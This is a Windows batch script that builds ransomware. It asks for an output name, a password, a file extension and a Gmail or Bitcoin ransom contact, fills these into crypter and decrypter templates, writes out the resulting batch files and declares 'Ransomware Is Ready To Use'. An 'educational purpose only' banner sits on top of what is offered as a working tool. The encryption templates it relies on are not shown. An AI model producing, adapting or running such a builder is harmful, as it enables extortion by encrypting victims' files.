@echo off          
color 0b
@mode con cols=150 lines=45
cls
echo. 
echo `7MM***Yp, `7MM                         `7MM***Yb.                        db  `7MM
echo   MM    Yb   MM                           MM    `Yb.                            MM
echo   MM    dP   MM `7MM  `7MM  .gP*Ya        MM     `Mb  .gP*Ya `7M'   `MF'`7MM    MM
echo   MM***bg.   MM   MM    MM ,M'   Yb       MM      MM ,M'   Yb  VA   ,V    MM    MM
echo   MM    `Y   MM   MM    MM 8M""""""       MM     ,MP 8M-*****   VA ,V     MM    MM
echo   MM     ,9  MM   MM    MM YM.    ,       MM    ,dP' YM.    ,    VVV      MM    MM
echo .JMMmmmd9  .JMML. `Mbod*YML.`Mbmmd'     .JMMmmmdP'    `Mbmmd'     W     .JMML..JMML.
echo.
colorchar /4f "!!!!!!!!!!!!!!!!!!!!!!! Strictly For Educational Purpose Only !!!!!!!!!!!!!!!!!!!!!!!"
echo.
echo.
colorchar /f "Enter The Output Name (Eg:Ransomware): "
set /p output=
echo.
colorchar /c "Enter The Pass (Eg:TmljZQ==): "
set /p pass=
echo.
colorchar /e "Enter The Extension To Convert (Eg:Joker): "
set /p exetension=
echo.
colorchar /c "Enter Gmail Id Or Bitcoin Id: "
set /p gmail=
echo.
cls
colorchar /4 "Creating The Ransomware Crypter."
timeout /t 02 >nul
cls
colorchar /a "Creating The Ransomware Crypter.."
powershell -Command "(gc Ransomware.Crypter.Source.Code.vs) -replace '_pass_', '%pass%' | Out-File -encoding ASCII 1.bat"
powershell -Command "(gc 1.bat) -replace '_gmail_', '%gmail%' | Out-File -encoding ASCII 2.bat"
cls
colorchar /b "Creating The Ransomware Crypter..."
powershell -Command "(gc 2.bat) -replace 'exetension', '%exetension%' | Out-File -encoding ASCII %output%.Crypter.bat"
cls
colorchar /d "Creating The Ransomware Crypter...."
timeout /t 02 >nul
cls
colorchar /c "Ransomware Crypter Is Created Successfully."
timeout /t 02 >nul
del 1.bat
del 2.bat
mkdir %output%
move %output%.Crypter.bat %output%
cls
colorchar /4 "Creating The Ransomware Decrypter."
timeout /t 02 >nul
cls
colorchar /a "Creating The Ransomware Decrypter.."
powershell -Command "(gc Ransomware.Decrypter.Source.Code.vs) -replace 'exetension', '%exetension%' | Out-File -encoding ASCII %output%.Decrypter.bat"
cls
colorchar /b "Creating The Ransomware Decrypter..."
timeout /t 02 >nul
cls
colorchar /d "Creating The Ransomware Decrypter...."
timeout /t 02 >nul
cls
colorchar /c "Ransomware Decrypter Is Created Successfully."
timeout /t 02 >nul
cls
colorchar /e "Creating Details File...."
timeout /t 02 >nul
cls
del 1.bat
move %output%.Decrypter.bat %output%
cls
cd %output%
echo ---------------------------------------- >> Details.txt
echo Date         : %date% >> Details.txt
echo Time         : %time% >> Details.txt
echo Gmail Id  >> Details.txt  
echo    Or        : %gmail% >> Details.txt  
echo BitCoin ID  >> Details.txt  
echo Password     : %pass% >> Details.txt
echo NameOfOutput : %output% >> Details.txt
echo ---------------Happy Hack--------------- >> Details.txt
@mode con cols=105 lines=10
color 4f
echo --------------------------------Ransomware Is Ready To Use.-----------------------------------
echo.
echo Crypter Output Path   : %cd%\%output%.Crypter.bat
echo Decrypter Output Path : %cd%\%Output%.Decrypter.bat
echo.
echo ----------------------------------------------------------------------------------------------
pause >nul
